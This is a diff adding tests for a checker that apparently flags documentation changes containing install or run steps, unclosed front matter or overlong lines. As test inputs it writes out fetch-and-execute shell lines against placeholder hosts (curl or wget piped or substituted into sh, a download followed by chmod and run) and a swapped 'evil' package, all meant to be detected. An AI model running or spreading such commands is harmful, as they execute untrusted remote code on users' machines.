@@ -199,6 +199,61 @@ const ownerRoot = () => {
 };
 const read = (dir: string, f: string) => readFileSync(join(dir, f), 'utf8');
 
+describe('install steps and upstream text', () => {
+  it.each([
+    ['a changed line after the same prefix', 'npm install -g safe\n', 'npm install -g evil\n'],
+    [
+      'the same install with a new flag',
+      'pip install a\n',
+      'pip install a --index-url https://x\n',
+    ],
+    ['npx', '', 'npx something\n'],
+    ['pnpm dlx', '', 'pnpm dlx something\n'],
+    ['download then run', '', 'curl -o x https://x.example && sh x\n'],
+    ['wget then chmod', '', 'wget https://x.example/a; chmod +x a; ./a\n'],
+    ['process substitution', '', 'bash <(curl -s https://x.example)\n'],
+    ['command substitution', '', 'sh -c "$(wget -qO- https://x.example)"\n'],
+    ['a pipe on its own line', '', 'cat setup.txt \\\n  | sh\n'],
+    ['upper case', '', 'PIP INSTALL thing\n'],
+  ])('%s is unclear', (_name, before, after) => {
+    const old = { ...OLD, 'docs/b.md': before };
+    const r = verdict({ ...old, 'docs/b.md': after }, old);
+    expect(r.verdict).toBe('unclear');
+    expect(r.findings.map((f) => f.kind)).toContain('install-step');
+  });
+  it('the same line in another spacing is no news', () => {
+    const old = { ...OLD, 'docs/b.md': 'npm install -g thing\n' };
+    expect(
+      verdict({ ...old, 'docs/b.md': '  npm   install -g thing  \nnew text\n' }, old).verdict,
+    ).toBe('fits');
+  });
+  it('a plain new line fits', () => {
+    expect(verdict({ ...OLD, 'docs/b.md': 'nothing to run here\n' }).verdict).toBe('fits');
+  });
+  it('hooks below the front matter are not front matter', () => {
+    expect(verdict({ ...OLD, 'docs/b.md': 'text\n---\nhooks:\n---\n' }).verdict).toBe('fits');
+    expect(verdict({ ...OLD, 'docs/b.md': '\n---\nhooks: x\n---\n' }).verdict).toBe('fits');
+  });
+  it('front matter that does not close soon is unclear', () => {
+    const body = `---\n${'a: b\n'.repeat(500)}`;
+    const r = verdict({ ...OLD, 'docs/b.md': body });
+    expect(r.verdict).toBe('unclear');
+    expect(r.findings.map((f) => f.kind)).toContain('front-matter');
+  });
+  it('a line over the limit is unclear and quickly so', () => {
+    const t = Date.now();
+    const r = verdict({ ...OLD, 'docs/b.md': `curl ${'x|'.repeat(200_000)}\n` });
+    expect(r.verdict).toBe('unclear');
+    expect(r.findings.map((f) => f.kind)).toContain('long-line');
+    expect(Date.now() - t).toBeLessThan(500);
+  });
+  it('front matter with many dashes costs no time', () => {
+    const t = Date.now();
+    verdict({ ...OLD, 'docs/b.md': `---\n${'-\n'.repeat(300_000)}` });
+    expect(Date.now() - t).toBeLessThan(1000);
+  });
+});
+
 describe('setupSources', () => {
   it('fetches a git source without hooks or links and pins the commit', async () => {
     const o = ownerRoot();
